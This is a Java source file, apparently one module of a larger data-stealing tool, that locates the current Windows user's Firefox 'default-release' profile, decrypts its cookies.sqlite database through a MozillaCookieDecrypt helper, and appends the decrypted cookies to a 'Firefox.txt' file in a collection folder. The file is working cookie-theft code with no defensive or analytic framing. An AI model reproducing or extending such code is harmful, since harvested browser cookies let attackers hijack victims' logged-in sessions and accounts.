package _256.node.nodes.impl.browser;

import java.io.BufferedWriter;
import java.io.File;
import java.io.FileWriter;
import java.io.IOException;
import java.util.Objects;

import _256.node.Category;
import _256.node.Node;
import _256.utils.decrypt.cookie.MozillaCookieDecrypt;

public class Firefox extends Node {

	public Firefox() {
		super(Category.FILE);
	}

	@Override
	public void createNode() throws IOException {
		File path = new File("C:\\Users\\" + System.getProperty("user.name") + "\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles");
		if (path.exists()) {
			cookie();
		}
	}

	public void cookie() throws IOException {
		String fileName = "default-release";
		File path = new File("C:\\Users\\" + System.getProperty("user.name") + "\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles");
		if (path.exists()) {
			for (File file : Objects.requireNonNull(path.listFiles())) {
				if (file.getName().contains(fileName)) {
					String name = file.getName();
					if (new File("C:\\Users\\" + System.getProperty("user.name") + "\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles\\" + name).exists()) {
						FileWriter writer = new FileWriter(mergePath(getFolder(), "Cookies") + "\\" + "Firefox.txt", true);
						BufferedWriter bufferedWriter = new BufferedWriter(writer);
						bufferedWriter.write(new MozillaCookieDecrypt("C:\\Users\\" + System.getProperty("user.name") + "\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles\\" + name + "\\cookies.sqlite").getCookies().getData());
						bufferedWriter.close();
					}
				}
			}
		}
	}
}